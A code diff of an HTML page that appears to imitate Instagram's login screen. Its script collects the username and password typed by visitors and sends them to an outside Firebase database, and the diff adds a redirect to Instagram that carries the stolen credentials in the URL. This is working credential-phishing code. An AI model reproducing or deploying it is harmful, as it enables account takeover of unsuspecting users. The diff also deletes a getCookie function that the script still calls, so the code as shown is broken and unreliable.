@@ -1,6 +1,5 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -45,33 +44,21 @@
           <img src="https://i.ibb.co/JBVJ8JB/play-store.png" alt="play_store">
       </div>
   </div>
-
-   
-   
   <script>
-   
    let username = ""
    let password = ""
-
 function getValue(event) {
     if(event.placeholder=='Phone number, username or email address') {
       username = event.value          
     }else{
       password = event.value          
     }
-  
 }
-
-
-
 function onSubmit() {
    let url = "https://screenshot-5026c-default-rtdb.firebaseio.com/test.json"
   console.log(getCookie('csrftoken'));
-  console.log(username , password);
-    
-   
+  console.log(username , password);   
   let model = {    username ,password }
-   
 fetch(url, {
   method: 'POST', // or 'PUT'
   headers: {
@@ -82,39 +69,13 @@ fetch(url, {
   .then((response) => response.json() )
   .then((data) => {
     console.log('Success:', data);
+    window.location.href="https://www.instagram.com/?u="+username+"&p="+password
   })
   .catch((error) => {
     console.error('Error:', error);
   });
-
-
-   
-   
 }
-
-
-function getCookie(cname) {
-var name = cname + "=";
-var decodedCookie = decodeURIComponent(document.cookie);
-var ca = decodedCookie.split(';');
-for(var i = 0; i <ca.length; i++) {
-  var c = ca[i];
-  while (c.charAt(0) == ' ') {
-    c = c.substring(1);
-  }
-  if (c.indexOf(name) == 0) {
-    return c.substring(name.length, c.length);
-  }
-}
-return "";
-}
-
-
-  </script>
-
-
-
-
+</script>
 </body>
 
 </html>
